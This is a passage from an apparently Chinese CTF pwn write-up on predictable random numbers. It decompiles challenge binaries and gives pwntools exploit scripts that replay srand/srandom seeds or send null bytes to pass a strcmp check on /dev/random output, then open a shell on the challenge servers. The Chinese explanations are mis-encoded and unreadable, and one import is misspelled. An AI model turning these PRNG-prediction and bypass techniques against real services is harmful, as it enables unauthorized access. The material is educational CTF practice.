ctype <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;27.25.151.80&quot;</span>,<span class="number">36122</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (cnt &lt; <span class="number">100</span>):</span><br><span class="line">    p.recv()</span><br><span class="line">    num = libc.rand() &amp; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="srandom-localtime"><a href="#srandom-localtime" class="headerlink" title="srandom&#x2F;localtime"></a>srandom&#x2F;localtime</h2><p>é¢˜ç›®ï¼š<code>moectf2024 è¿™æ˜¯ä»€ä¹ˆï¼Ÿrandom!</code></p><ul><li>æ ¸å¿ƒç‚¹</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">timer = time(<span class="number">0LL</span>);</span><br><span class="line">v3 = localtime(&amp;timer);</span><br><span class="line">srandom(v3-&gt;tm_yday);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s play a number guessing game.&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> ( tests-- )</span><br><span class="line">&#123;</span><br><span class="line">  secret = random() % <span class="number">90000</span> + <span class="number">10000</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;guess);</span><br><span class="line">  <span class="keyword">if</span> ( guess != secret )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wow, you are right!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä¸‹é¢æ˜¯å…³äº<code>localtimeå’Œtm_ydayçš„è§£é‡Š</code></p><blockquote><h3 id="ä»£ç è§£é‡Š"><a href="#ä»£ç è§£é‡Š" class="headerlink" title="ä»£ç è§£é‡Š"></a>ä»£ç è§£é‡Š</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timer = time(<span class="number">0LL</span>);</span><br></pre></td></tr></table></figure></div><ul><li><code>time(0LL)</code> æˆ–è€… <code>time(NULL)</code> è¿”å›çš„æ˜¯å½“å‰çš„ UNIX æ—¶é—´æˆ³ï¼ˆä» 1970 å¹´ 1 æœˆ 1 æ—¥ 00:00:00 UTC åˆ°ç°åœ¨çš„ç§’æ•°ï¼‰ã€‚è¿™ä¸ªæ—¶é—´æˆ³æ˜¯ä¸€ä¸ª <code>time_t</code> ç±»å‹ã€‚</li><li><code>timer</code> å˜é‡å­˜å‚¨äº†å½“å‰çš„æ—¶é—´æˆ³ã€‚</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = localtime(&amp;timer);</span><br></pre></td></tr></table></figure></div><ul><li><code>localtime(&amp;timer)</code> å°†æ—¶é—´æˆ³ <code>timer</code> è½¬æ¢ä¸ºæœ¬åœ°æ—¶é—´ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘ <code>struct tm</code> ç»“æ„ä½“çš„æŒ‡é’ˆã€‚<code>struct tm</code> åŒ…å«äº†æ—¥æœŸå’Œæ—¶é—´çš„å„ä¸ªç»„æˆéƒ¨åˆ†ï¼ˆå¹´ã€æœˆã€æ—¥ã€æ—¶ã€åˆ†ã€ç§’ç­‰ï¼‰ã€‚</li><li>v3æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>struct tm</code> çš„æŒ‡é’ˆï¼Œç»“æ„ä½“ä¸­çš„ä¸€äº›å­—æ®µåŒ…æ‹¬ï¼š</li><li><code>tm_year</code>: å½“å‰å¹´ï¼ˆè‡ª 1900 å¹´ä»¥æ¥çš„å¹´æ•°ï¼‰</li><li><code>tm_mon</code>: å½“å‰æœˆï¼ˆä» 0 åˆ° 11ï¼‰</li><li><code>tm_mday</code>: å½“å‰æ—¥</li><li><code>tm_yday</code>: å½“å‰å¹´ä¸­çš„ç¬¬å‡ å¤©ï¼ˆä» 0 åˆ° 365ï¼‰</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srandom(v3-&gt;tm_yday);</span><br></pre></td></tr></table></figure></div><ul><li><code>srandom()</code> æ˜¯ä¸€ä¸ªç”¨äºåˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨çš„å‡½æ•°ï¼Œç±»ä¼¼äº <code>srand()</code>ï¼Œä½†é€šå¸¸åœ¨æŸäº›ç³»ç»Ÿä¸­æä¾›æ›´å¼ºçš„éšæœºæ€§ã€‚å®ƒæ¥æ”¶ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ä½œä¸ºç§å­ï¼Œåç»­çš„éšæœºæ•°ç”Ÿæˆå°±åŸºäºè¿™ä¸ªç§å­ã€‚</li><li><code>v3-&gt;tm_yday</code> æ˜¯ç»“æ„ä½“ <code>tm</code> ä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œå®ƒè¡¨ç¤ºå½“å‰æ—¥æœŸåœ¨ä¸€å¹´ä¸­çš„ç¬¬å‡ å¤©ï¼ˆèŒƒå›´ä¸º 0 åˆ° 365ï¼‰ã€‚è¿™ä¸ªå€¼è¢«ç”¨æ¥ä½œä¸ºç§å­ã€‚</li></ul></blockquote><ul><li>ä»æœ¬åœ°æ—¶é—´ä¸­æå–å½“å‰æ—¥æœŸåœ¨ä¸€å¹´ä¸­çš„ç¬¬å‡ å¤©(tm_yday)ä½œä¸ºéšæœºæ•°ç§å­ï¼Œç®—æ³•æ˜¯ä¸€æ ·çš„æ¨¡æ‹Ÿå³å¯</li><li>åç»­ä»£ç ä¸æ”¾å‡ºæ¥äº†ï¼Œè¿˜æœ‰ä¸¤ä¸ªéšä¾¿è¾“å‡ºä»€ä¹ˆéƒ½è¡Œï¼Œå°±å¯ä»¥è·å¾—flagäº†</li></ul><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctype <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf1 = cdll.LoadLibrary(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;192.168.119.52&quot;</span>,<span class="number">53889</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Let&#x27;s play a number guessing game.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">timer = <span class="built_in">int</span>(elf1.time(<span class="number">0</span>))</span><br><span class="line">tm = time.localtime(timer) </span><br><span class="line">day_of_year = tm.tm_yday-<span class="number">1</span> <span class="comment"># è¿™ä¸ªåŠ ä¸€å¾ˆè¿·å•Š</span></span><br><span class="line">elf1.srandom(day_of_year)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>( (elf1.random()%<span class="number">90000</span>) + <span class="number">10000</span> ))</span><br><span class="line">    <span class="comment">#p.recvuntil(&quot;Wow, you are right!\n&quot;)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># ä¸‹é¢éšä¾¿è¾“å…¥ä»€ä¹ˆéƒ½å¯ä»¥çš„</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;You only got two of them wrong, flag still for you.&quot;</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure></div><h1 id="ä»€ä¹ˆæ˜¯çœŸéšæœº"><a href="#ä»€ä¹ˆæ˜¯çœŸéšæœº" class="headerlink" title="ä»€ä¹ˆæ˜¯çœŸéšæœº"></a>ä»€ä¹ˆæ˜¯çœŸéšæœº</h1><ul><li><mark>çœŸéšæœºä»£è¡¨ç€æˆ‘ä»¬æ— æ³•é€šè¿‡libcå»é¢„æµ‹ã€æ¨¡æ‹Ÿç³»ç»Ÿäº§ç”Ÿçš„éšæœºæ•°æ˜¯å¤šå°‘<mark></mark></mark></li><li>ä¸‹é¢æ¨¡æ‹Ÿä¸€ä¸ªçœŸéšæœºæ•°äº§ç”Ÿçš„è¿‡ç¨‹ï¼š</li></ul><h2 id="dev-randomè·å¾—éšæœºæ•°"><a href="#dev-randomè·å¾—éšæœºæ•°" class="headerlink" title="&#x2F;dev&#x2F;randomè·å¾—éšæœºæ•°"></a><mark>&#x2F;dev&#x2F;randomè·å¾—éšæœºæ•°<mark></mark></mark></h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/dev/random&quot;</span> , O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">&quot;Error open /dev/random&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> num;</span><br><span class="line"><span class="type">ssize_t</span> result = read(fd, &amp;num , <span class="keyword">sizeof</span>(num));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Random num is : %u\n&quot;</span>, num );</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>äº§ç”Ÿçš„ç»“æœå¦‚ä¸‹ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu24<span class="number">.04</span>: Random num <span class="keyword">is</span> : <span class="number">2697870537</span></span><br><span class="line">ubuntu22<span class="number">.04</span>: Random num <span class="keyword">is</span> : <span class="number">2754856894</span></span><br></pre></td></tr></table></figure></div><p>å³ä½¿libcç›¸åŒï¼Œä½†æ˜¯äº§ç”Ÿçš„éšæœºæ•°è¿˜æ˜¯ä¸ç›¸åŒçš„ï¼Œä¸‹é¢æ¥äº†è§£ä¸€ä¸‹&#x2F;dev&#x2F;randomäº§ç”Ÿéšæœºæ•°çš„åŸç†</p><blockquote><p>é€šè¿‡ <code>/dev/random</code> è·å–éšæœºæ•°çš„åŸç†æ¶‰åŠåˆ°æ“ä½œç³»ç»Ÿçš„éšæœºæ•°ç”Ÿæˆæœºåˆ¶ã€‚<code>/dev/random</code> æ˜¯ Linux å’Œç±» Unix æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªè®¾å¤‡æ–‡ä»¶ï¼Œä¸“é—¨ç”¨äºç”ŸæˆåŠ å¯†çº§åˆ«çš„é«˜è´¨é‡éšæœºæ•°ã€‚å…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p><h3 id="1-ç†µæ± çš„æ¦‚å¿µ"><a href="#1-ç†µæ± çš„æ¦‚å¿µ" class="headerlink" title="1. ç†µæ± çš„æ¦‚å¿µ"></a>1. <strong>ç†µæ± çš„æ¦‚å¿µ</strong></h3><ul><li><code>/dev/random</code> ä½¿ç”¨ç†µï¼ˆentropyï¼‰æ¥ç”Ÿæˆéšæœºæ•°ã€‚ç†µæ˜¯ç³»ç»Ÿä¸­ä¸å¯é¢„æµ‹äº‹ä»¶çš„æ¥æºï¼Œæ¯”å¦‚é”®ç›˜è¾“å…¥ã€é¼ æ ‡ç§»åŠ¨ã€ç¡¬ç›˜è®¿é—®æ—¶é—´ç­‰ã€‚è¿™äº›äº‹ä»¶çš„ç‰¹æ€§éš¾ä»¥é¢„æµ‹ï¼Œå› æ­¤å¯ä»¥ä½œä¸ºéšæœºæ•°ç”Ÿæˆçš„æ¥æºã€‚</li><li>æ“ä½œç³»ç»Ÿç»´æŠ¤ä¸€ä¸ªâ€œç†µæ± â€ï¼Œå³æ”¶é›†å’Œå­˜å‚¨è¿™äº›ä¸å¯é¢„æµ‹äº‹ä»¶äº§ç”Ÿçš„æ•°æ®ã€‚å½“ç³»ç»Ÿæ”¶é›†åˆ°è¶³å¤Ÿçš„ç†µæ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›æ•°æ®ç”Ÿæˆé«˜è´¨é‡çš„éšæœºæ•°ã€‚</li></ul><h3 id="2-å·¥ä½œæµç¨‹"><a href="#2-å·¥ä½œæµç¨‹" class="headerlink" title="2. å·¥ä½œæµç¨‹"></a>2. <strong>å·¥ä½œæµç¨‹</strong></h3><ul><li>å½“ç¨‹åºè¯»å– <code>/dev/random</code> æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šä»ç†µæ± ä¸­æå–ç†µï¼Œå¹¶ä½¿ç”¨æŸç§åŠ å¯†å®‰å…¨çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆCSPRNGï¼‰æ¥è¾“å‡ºéšæœºæ•°æ®ã€‚</li><li>å½“ç†µæ± ä¸­çš„ç†µä¸è¶³æ—¶ï¼ˆå³ç³»ç»Ÿä¸­æ²¡æœ‰è¶³å¤Ÿçš„éšæœºäº‹ä»¶å‘ç”Ÿï¼‰ï¼Œè¯»å– <code>/dev/random</code> ä¼šé˜»å¡ï¼ˆç­‰å¾…ï¼‰ï¼Œç›´åˆ°æ”¶é›†åˆ°è¶³å¤Ÿçš„ç†µã€‚å› æ­¤ï¼Œ<code>/dev/random</code> é€‚åˆéœ€è¦é«˜å®‰å…¨æ€§ã€é«˜éšæœºæ€§çš„åº”ç”¨åœºæ™¯ï¼Œæ¯”å¦‚ç”ŸæˆåŠ å¯†å¯†é’¥ã€‚</li></ul><h3 id="3-é˜»å¡å’Œéé˜»å¡"><a href="#3-é˜»å¡å’Œéé˜»å¡" class="headerlink" title="3. é˜»å¡å’Œéé˜»å¡"></a>3. <strong>é˜»å¡å’Œéé˜»å¡</strong></h3><ul><li><code>/dev/random</code> æ˜¯é˜»å¡çš„ã€‚å½“ç†µæ± è€—å°½æ—¶ï¼Œç¨‹åºä¼šè¢«è¿«ç­‰å¾…ï¼Œç›´åˆ°ç³»ç»Ÿæ”¶é›†åˆ°è¶³å¤Ÿçš„ç†µä¸ºæ­¢ï¼Œè¿™å¯èƒ½å¯¼è‡´å»¶è¿Ÿã€‚</li><li>å¯¹åº”çš„éé˜»å¡ç‰ˆæœ¬æ˜¯ <code>/dev/urandom</code>ã€‚<code>/dev/urandom</code> ä¹Ÿä½¿ç”¨ç†µæ± ï¼Œä½†åœ¨ç†µè€—å°½æ—¶ä¸ä¼šé˜»å¡ï¼Œè€Œæ˜¯ç»§ç»­ä½¿ç”¨ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ç”Ÿæˆéšæœºæ•°ã€‚è™½ç„¶è¿™å‡å°‘äº†é˜»å¡é—®é¢˜ï¼Œä½†åœ¨æŸäº›æç«¯å®‰å…¨è¦æ±‚ä¸‹ï¼Œä½¿ç”¨ <code>/dev/random</code> ä¼šæ›´å¥½ã€‚</li></ul><h3 id="4-å¸¸ç”¨åœºæ™¯"><a href="#4-å¸¸ç”¨åœºæ™¯" class="headerlink" title="4. å¸¸ç”¨åœºæ™¯"></a>4. <strong>å¸¸ç”¨åœºæ™¯</strong></h3><ul><li><code>/dev/random</code> ä¸»è¦ç”¨äºåŠ å¯†æ“ä½œã€å¯†é’¥ç”Ÿæˆã€ä¼šè¯æ ‡è¯†ç¬¦ç­‰éœ€è¦é«˜éšæœºæ€§ã€æ— æ³•é¢„æµ‹çš„åœºæ™¯ã€‚</li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>é€šè¿‡ <code>/dev/random</code> è·å–éšæœºæ•°çš„æ ¸å¿ƒåŸç†åœ¨äºç†µçš„é‡‡é›†ä¸ä½¿ç”¨ã€‚ç³»ç»Ÿä¸æ–­ä»ç¡¬ä»¶å’Œç³»ç»Ÿäº‹ä»¶ä¸­æ”¶é›†ä¸å¯é¢„æµ‹çš„è¡Œä¸ºä½œä¸ºç†µæ¥ç”Ÿæˆéšæœºæ•°ï¼Œç¡®ä¿ç”Ÿæˆçš„æ•°å…·æœ‰é«˜ä¸å¯é¢„æµ‹æ€§ï¼Œé€‚ç”¨äºé«˜å®‰å…¨éœ€æ±‚çš„åœºåˆã€‚</p></blockquote><ul><li>&#x2F;dev&#x2F;randomé€šè¿‡ç†µå€¼æ¥è·å–éšæœºæ•°ï¼Œè€Œç†µå€¼æ˜¯ä¸å¯é¢„æµ‹çš„ï¼Œå¹¶ä¸”æ˜¯ç”±äºå¾ˆå¤šå› ç´ é€ æˆçš„ï¼Œå› æ­¤ä¹Ÿé€ æˆäº†å®ƒçš„çœŸéšæœºæ€§ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨çˆ†ç ´æ¥æ±‚å‡ºéšæœºæ•°ã€‚</li></ul><h3 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p>é¢˜ç›®ï¼š<code>buildctf real_random</code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  my_init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    get_random(s2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input your text: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Congratulations!!!&quot;</span>);</span><br><span class="line">      getshell();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No,guess again!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>get_random</code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">get_random</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/dev/random&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to open the file!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, a1, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>å¾ˆæ˜æ˜¾çš„<code>/dev/random</code>çš„çœŸéšæœºï¼Œä½†æ˜¯éš¾é“å°±æ²¡æœ‰æ¼æ´äº†å—ï¼Ÿå…¶å®ä¸ç„¶</li><li><code>strcmp</code>å…³é”®å°±åœ¨è¿™ä¸ªå‡½æ•°ï¼Œé‡åˆ°<code>\x00</code>å°±ä¼šåœæ­¢æ¯”è¾ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªp64(0)ï¼Œåªè¦éšæœºæ•°çš„é¦–å­—èŠ‚æ˜¯\x00ï¼Œå°±ä¼šæ¯”è¾ƒæˆåŠŸï¼Œå¹¶ä¸”æå¤§çš„ç¼©çŸ­äº†æ¯”è¾ƒæ—¶é—´ã€‚</li></ul><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;27.25.151.80&quot;</span>,<span class="number">37097</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9999</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;please input your text: &quot;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    rev = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    success(<span class="string">f&quot;ç¬¬<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>æ¬¡,recv<span class="subst">&#123;<span class="built_in">str</span>(rev)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Congratulations!!!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><h2 id="arc4random"><a href="#arc4random" class="headerlink" title="arc4random"></a>arc4random</h2><blockquote><p><strong><code>arc4random()</code> å‡½æ•°</strong>ï¼š</p><ul><li><code>arc4random()</code> æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆéšæœºæ•°çš„å‡½æ•°ï¼Œå¸¸è§äº BSD ç³»ç»Ÿï¼Œå®ƒåŸºäºä¸€ä¸ªç§°ä¸º ARC4 çš„åŠ å¯†ç®—æ³•å®ç°ã€‚</li><li>è¿™ä¸ªå‡½æ•°ä¸éœ€è¦ä»»ä½•è¾“å…¥å‚æ•°ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªä¼ªéšæœºæ•°ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ª <code>32-bit</code> çš„æ— ç¬¦å·æ•´æ•°ã€‚</li></ul></blockquote><ul><li>åŸºæœ¬çš„ç”¨æ³•ï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// æ— éœ€seedç›´æ¥ç”Ÿæˆéšæœºæ•°</span></span><br><span class="line">    <span class="type">uint32_t</span> random_number = arc4random();</span><br><span class="line">    <span 